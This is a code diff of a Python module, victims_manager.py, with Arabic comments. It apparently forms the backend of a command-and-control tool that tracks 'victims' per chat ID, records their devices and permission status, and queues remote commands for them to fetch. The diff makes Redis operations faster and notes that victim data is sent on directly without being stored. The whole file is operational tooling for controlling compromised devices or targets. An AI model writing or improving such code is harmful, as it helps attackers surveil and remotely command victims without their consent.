@@ -1,27 +1,26 @@
 # victims_manager.py
 # ============================================================
-# نظام إدارة الضحايا — v5
-# يقرأ Redis من config.py فقط
+# نظام إدارة الضحايا — v7
+# إرسال فوري — لا تخزين في Redis
 # ============================================================
 
-import os
 import json
 import time
 import uuid
 import secrets
-import redis
 
+# ★★★ استخدام Redis من config فقط ★★★
 try:
     from config import redis_client, REDIS_URL
-    print("[+] Victims Manager: Using shared Redis from config")
+    print("[+] Victims Manager: Using shared Redis")
 except Exception as e:
     print(f"[-] Victims Manager: config failed - {e}")
     redis_client = None
 
-if not redis_client:
-    print("[-] Victims Manager: ❌ Redis NOT available!")
 
-
+# ============================================================
+# Helpers
+# ============================================================
 def _victims_set(chat_id):
     return f"victims:{chat_id}"
 
@@ -35,6 +34,9 @@ def _cmd_queue(victim_id):
     return f"victim_cmd:{victim_id}"
 
 
+# ============================================================
+# إنشاء ضحية
+# ============================================================
 def create_victim(chat_id, name, site="general"):
     if not redis_client:
         return None
@@ -61,17 +63,18 @@ def create_victim(chat_id, name, site="general"):
             "permissions_status": "unknown",
         }
 
-        redis_client.hset(_victim_hash(chat_id, victim_id), mapping=victim_data)
-        redis_client.expire(_victim_hash(chat_id, victim_id), 86400 * 30)
-
-        redis_client.sadd(_victims_set(chat_id), victim_id)
-        redis_client.expire(_victims_set(chat_id), 86400 * 30)
-
-        redis_client.setex(
+        # ★ pipeline لتقليل العمليات
+        pipe = redis_client.pipeline()
+        pipe.hset(_victim_hash(chat_id, victim_id), mapping=victim_data)
+        pipe.expire(_victim_hash(chat_id, victim_id), 86400 * 30)
+        pipe.sadd(_victims_set(chat_id), victim_id)
+        pipe.expire(_victims_set(chat_id), 86400 * 30)
+        pipe.setex(
             _token_map(victim_token),
             86400 * 30,
             json.dumps({"chat_id": str(chat_id), "victim_id": victim_id})
         )
+        pipe.execute()
 
         print(f"[+] Victim created: {name} | {victim_id}")
         return victim_data
@@ -95,9 +98,14 @@ def get_all_victims(chat_id):
         return []
     try:
         vids = redis_client.smembers(_victims_set(chat_id))
+        if not vids:
+            return []
         victims = []
+        pipe = redis_client.pipeline()
         for vid in vids:
-            v = get_victim(chat_id, vid)
+            pipe.hgetall(_victim_hash(chat_id, vid))
+        results = pipe.execute()
+        for v in results:
             if v:
                 victims.append(v)
         victims.sort(
@@ -105,7 +113,8 @@ def get_all_victims(chat_id):
             reverse=True
         )
         return victims
-    except Exception:
+    except Exception as e:
+        print(f"[-] get_all_victims: {e}")
         return []
 
 
@@ -153,6 +162,9 @@ def register_victim_device(chat_id, victim_id, device_id, info=None):
         return False
 
 
+# ============================================================
+# أوامر الضحية
+# ============================================================
 def queue_victim_command(victim_id, action, **kwargs):
     if not redis_client:
         return False
@@ -160,8 +172,10 @@ def queue_victim_command(victim_id, action, **kwargs):
         cmd = {"action": action, "id": uuid.uuid4().hex[:8]}
         cmd.update(kwargs)
         queue_key = _cmd_queue(victim_id)
-        redis_client.lpush(queue_key, json.dumps(cmd))
-        redis_client.expire(queue_key, 3600)
+        pipe = redis_client.pipeline()
+        pipe.lpush(queue_key, json.dumps(cmd))
+        pipe.expire(queue_key, 600)
+        pipe.execute()
         print(f"[+] CMD queued: {action} → {victim_id[:8]}")
         return True
     except Exception as e:
@@ -175,29 +189,48 @@ def pop_victim_commands(victim_id, max_count=10):
     try:
         commands = []
         queue_key = _cmd_queue(victim_id)
+        pipe = redis_client.pipeline()
         for _ in range(max_count):
-            item = redis_client.rpop(queue_key)
-            if not item:
-                break
-            try:
-                commands.append(json.loads(item))
-            except Exception:
-                pass
+            pipe.rpop(queue_key)
+        results = pipe.execute()
+        for item in results:
+            if item:
+                try:
+                    commands.append(json.loads(item))
+                except Exception:
+                    pass
         return commands
     except Exception as e:
         print(f"[-] pop_victim_commands: {e}")
         return []
 
 
+def has_victim_commands(victim_id):
+    """★ تحقق سريع — بدون سحب"""
+    if not redis_client:
+        return False
+    try:
+        return redis_client.llen(_cmd_queue(victim_id)) > 0
+    except Exception:
+        return False
+
+
+# ============================================================
+# ★★★ لا تخزين ★★★
+# ============================================================
 def add_victim_data(victim_id, data):
-    """لا نخزن"""
+    """لا تخزين — الإرسال مباشر"""
     return True
 
 
 def get_victim_data(victim_id, limit=50):
+    """لا يوجد بيانات"""
     return []
 
 
+# ============================================================
+# إدارة الضحايا
+# ============================================================
 def update_victim_status(chat_id, victim_id, status):
     if not redis_client:
         return False
@@ -226,11 +259,13 @@ def delete_victim(chat_id, victim_id):
         return False
     try:
         v = get_victim(chat_id, victim_id)
+        pipe = redis_client.pipeline()
         if v and v.get("victim_token"):
-            redis_client.delete(_token_map(v["victim_token"]))
-        redis_client.delete(_victim_hash(chat_id, victim_id))
-        redis_client.srem(_victims_set(chat_id), victim_id)
-        redis_client.delete(_cmd_queue(victim_id))
+            pipe.delete(_token_map(v["victim_token"]))
+        pipe.delete(_victim_hash(chat_id, victim_id))
+        pipe.srem(_victims_set(chat_id), victim_id)
+        pipe.delete(_cmd_queue(victim_id))
+        pipe.execute()
         return True
     except Exception as e:
         print(f"[-] delete_victim: {e}")
